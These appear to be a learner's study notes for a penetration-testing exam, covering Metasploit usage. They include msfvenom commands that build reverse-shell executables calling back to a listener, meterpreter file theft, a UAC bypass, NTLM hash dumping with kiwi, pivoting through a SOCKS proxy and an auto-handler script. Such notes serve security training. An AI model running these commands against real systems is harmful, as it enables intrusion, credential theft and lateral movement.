# Metasploit Intro

## Rules:
- Allow in ALL machines
    ```
    multi/handler
    msfvenom (excluding meterpreter payload),
    pattern_create 
    pattern_offset 
    ```
- Allow in SINGLE machines
  ```
    meterpreter
    auxiliary
    post
    exploit
    scan
  ```

## Basics
- ``` workspace -a {new workspace name}``` add | delete ``` -d ```
- ``` db_nmap ``` Nmap inside Metasploit 
- ``` hosts ``` list of all discovered hosts up to this point
- ``` services -p {port}``` show all discovered services

## Auxiliary Module (輔助)
- ``` search type:auxiliary {module name} ``` search
- ``` use {module_id} ``` load certain module
- ``` info ``` show info
- ``` show options ``` 
- ``` unset RHOSTS ``` reset param
- ``` run ```
- ``` vulns```

## Exploit Module
- ``` search type:exploit {module name} ``` search
- ``` set payload payload/linux/x64/shell_reverse_tcp ```
- when success will have shell created -> move to background with ctrl z
- show sessions in background ``` sessions -l ``` 
- kill sessions ``` session -k {id} ``` | ``` session -K ``` kill all
- reset workspace wont kill sessions
- Change target(OS) ``` set target {0 or 1} ``` 0 = unix | 1 = windows

# Payloads
## Staged vs Non-Staged
- ``` / ``` = Staged & ``` _ ``` Stagless for name
- Staged : 2 step to bypass AV (send smaller packet first, then smuggle the payload thru another step)
- Stageless : 1 step (large & one take) 

## meterpreter payload
- multiple cmd packaged for staged one & not directly have a Remote shell ( can do other stuff)
- ```  sysinfo ``` 
- ``` getuid ``` get UID lolll
- ``` shell ``` generate shell 
- ``` channel -l ``` show all active channel | ``` channel -i {id} ``` use certain channel
- ``` download /etc/passwd ``` = scp
- ``` lcat ``` = meterpreter version cat
- ``` upload /usr/bin/unix-privesc-check /tmp/ ``` = scp
- ``` ls {dir}``` = ls loll
- ``` search -f {fileName} ```
- ``` getsystem ``` auto priv esc
- ``` ps ``` show all process
- ``` bg ``` background the session
  
## Executable Payloads (exe,ps1,bin)
### msfvenom
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom 
- ``` msfvenom -l payloads --platform {windows/php/etc...} --arch x64 ``` show all payloads with criteria
- ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe ``` example of generating payload

### metasploit handler in kali
- some payload req msf to connect & ncat cant handle
- ``` msf6> use multi/handler ```


# Post Exploit for windows
- Module = Post
## Migrate to other process
  1. throw reverse shell (``` msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe ```) to victim 
  2. connect back kali by multi/handler e.g.(``` set payload windows/x64/meterpreter_reverse_https ```)
  3. try list all process ``` ps ```
  4. ``` migrate {pid} ``` sometimes not successful then try his parent(PPID) with same user 
## UAC
- ```msf6> search UAC ``` 
  1. once get the shell ``` meterpreter > shell ```
  2. windows ``` powershell -ep bypass ```
  3. check UAC level: ``` Import-Module NtObjectManager ``` then ``` Get-NtTokenIntegrityLevel ```
  4. useful UAC bypass : ``` use exploit/windows/local/bypassuac_sdclt ```
  5. bind to the session that we previous made ( can recheck with session list cmd ) then ``` set session {sid} ```

### Load mikikaze
  1. Req admin OR UAC High priv
  2. ``` load kiwi ``` load & ``` help ``` see all cmd 
  3. ``` creds_msv ``` get NTLM/SHA-1 hashs of users

### Use other post script for the session
 - e.g. enum hosts file
 - ``` use post/windows/gather/enum_hostfile ``` then bind to session we create before ``` set session {sid}```

## Pivoting 
### Manual route
- Check another ip in other subnet e.g. 172.16.155.18 -> subnet=172.16.155.0 (probably, need see /??)
- port forwardingset in routing table ``` route add 172.16.{subnet}.0/24 {session_id} ```
- print route table assigned ``` route print ```
- test with port scan module e.g. ``` use auxiliary/scanner/portscan/tcp ``` to see if routing success
- terminate all routes ``` route flush ``` | remove 1 only ``` route remove {ip}/24 {session_id} ```
### Auto Route
- ``` use multi/manage/autoroute ``` and then bind to the shell session we made before

### Proxy
- ``` use auxiliary/server/socks_proxy ``` & ``` set SRVHOST 127.0.0.1 ``` (only allow host to call seems more safe) & ``` set SRVPORT 9999 ```
-  edit ```/etc/proxychains4.conf``` to the one we set e.g. ``` socks5 {SRVHOST} {SRVPORT}``` (entry point of the proxy)
-  

# Auto fucking metasploit
- write all command of metasploit and save in a script with ruby : autoFuck.rc (maybe)
  e.g. 
    ```
      use exploit/multi/handler
      set PAYLOAD windows/meterpreter_reverse_https
      set LHOST 192.168.45.154
      set LPORT 6969
      set AutoRunScript post/windows/manage/migrate
      set ExitOnSession false
      run -z -j
    ```
- ``` sudo msfconsole -r {script name}.rc ```